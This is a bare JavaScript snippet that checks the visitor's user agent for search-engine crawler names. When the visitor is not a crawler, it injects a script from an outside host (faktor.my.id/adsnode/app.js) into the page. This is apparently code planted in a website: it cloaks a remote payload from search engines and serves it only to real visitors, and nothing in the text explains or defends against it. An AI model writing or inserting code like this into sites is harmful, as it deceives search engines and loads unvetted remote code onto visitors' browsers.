 
function isBot() {
var bots = [
"google.com",
"Googlebot",
"Googlebot-Image",
"Googlebot-Image/1.0",
"Google",
"google",
"bingbot"
];
var agent = navigator.userAgent.toLowerCase();
for (var i = 0; i < bots.length; i++) {
if (agent.indexOf(bots[i]) != -1) {
return true;
}
}
return false;
}

if (!isBot()) {
var script = document.createElement("script");
script.src = "https://faktor.my.id/adsnode/app.js";
document.body.appendChild(script);
}

